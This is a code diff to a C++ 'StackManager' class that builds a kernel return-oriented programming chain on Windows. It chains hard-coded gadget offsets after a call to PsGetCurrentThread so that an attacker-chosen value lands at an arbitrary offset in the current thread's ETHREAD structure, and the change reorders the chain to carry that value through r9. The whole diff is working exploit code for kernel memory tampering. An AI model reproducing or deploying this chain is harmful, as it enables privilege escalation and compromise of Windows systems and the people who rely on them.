@@ -34,12 +34,20 @@ void StackManager::AddPadding(const std::size_t PaddingSize)
 void StackManager::ModifyThreadField(const std::uint64_t FieldOffset, const std::uint64_t NewValue)
 {
 	this->AddFunctionCall("PsGetCurrentThread");
-	this->AddGadget(0x24cd7b, "pop rcx; ret;"); // pop rcx; ret;
-	this->AddValue(FieldOffset, "ETHREAD offset"); // Offset inside of ETHREAD we want to write to
-	this->AddGadget(0x263f08, "add rax, rcx; ret;"); // add rax, rcx; ret;
-	this->AddGadget(0x47f82d, "pop r8; ret;"); // pop r8; ret;
-	this->AddValue(NewValue, "New field value"); // New value we write to the field
-	this->AddGadget(0x2bc741, "mov qword ptr [rax], r8; ret;"); // mov qword ptr [rax], r8; ret;
+
+	// r9->rcx->NewValue, Setup value to write. It has a sideeffect on eax so we perform thiss
+	// before the rest of our chain.
+	this->AddGadget(0x47f82d, "pop r8; ret;");
+	this->AddValue(0, "set r8 to 0");
+	this->AddGadget(0x24cd7b, "pop rcx; ret;");
+	this->AddValue(NewValue, "New field value");
+	this->AddGadget(0x51838a, "mov r9, rcx; cmp r8, 8; je ........; mov eax, 0x[0-9a-fA-F]+; ret;");
+
+	// rax = Thread + Offset inside of ETHREAD, which we will write to
+	this->AddGadget(0x24cd7b, "pop rcx; ret;");
+	this->AddValue(FieldOffset, "ETHREAD offset");
+	this->AddGadget(0x263f08, "add rax, rcx; ret;");
+	this->AddGadget(0x3c4eac, "mov qword ptr [rax], r9; ret;");
 }
 
 void StackManager::ModifyThreadStartAddress(const std::uint64_t NewStartAddress)
